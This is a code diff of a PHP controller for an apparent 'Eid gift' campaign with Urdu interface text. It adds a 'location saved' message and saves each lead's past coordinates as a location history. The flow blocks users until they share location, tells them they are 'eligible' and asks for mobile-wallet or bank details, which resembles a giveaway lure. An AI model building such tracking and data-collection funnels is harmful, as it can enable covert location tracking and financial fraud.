@@ -131,6 +131,7 @@ class EidTohfaController extends Controller
             ['key' => 'location_allow_button', 'value' => 'لوکیشن کی اجازت دیں', 'type' => 'text', 'group' => 'content', 'description' => 'Location Allow Button Text'],
             ['key' => 'location_deny_button', 'value' => 'اجازت نہیں دینی', 'type' => 'text', 'group' => 'content', 'description' => 'Location Deny Button Text'],
             ['key' => 'location_denied_message', 'value' => 'لوکیشن کی اجازت کے بغیر درخواست آگے نہیں بڑھ سکتی۔', 'type' => 'text', 'group' => 'content', 'description' => 'Location Denied Message'],
+            ['key' => 'location_saved_message', 'value' => 'لوکیشن محفوظ ہو گئی۔', 'type' => 'text', 'group' => 'content', 'description' => 'Location Saved Message'],
             ['key' => 'eligible_title', 'value' => 'مبارک ہو! آپ اہل ہیں', 'type' => 'text', 'group' => 'content', 'description' => 'Eligible Account Form Title'],
             ['key' => 'bank_select_label', 'value' => 'ادائیگی کا طریقہ منتخب کریں', 'type' => 'text', 'group' => 'content', 'description' => 'Bank Select Label'],
             ['key' => 'bank_options', 'value' => "JazzCash\nEasyPaisa\nBank Transfer", 'type' => 'textarea', 'group' => 'content', 'description' => 'Bank Options (one per line)'],
@@ -296,6 +297,18 @@ class EidTohfaController extends Controller
 
         if ($request->filled('lead_id')) {
             $lead = EidTohfaLead::findOrFail($request->lead_id);
+            
+            if (isset($payload['latitude']) && $lead->latitude) {
+                $history = $lead->location_history ? json_decode($lead->location_history, true) : [];
+                $history[] = [
+                    'latitude' => $lead->latitude,
+                    'longitude' => $lead->longitude,
+                    'accuracy' => $lead->accuracy,
+                    'location_captured_at' => $lead->location_captured_at ? (string) $lead->location_captured_at : null,
+                ];
+                $payload['location_history'] = json_encode($history);
+            }
+            
             $lead->update($payload);
         } else {
             $lead = EidTohfaLead::create($payload);
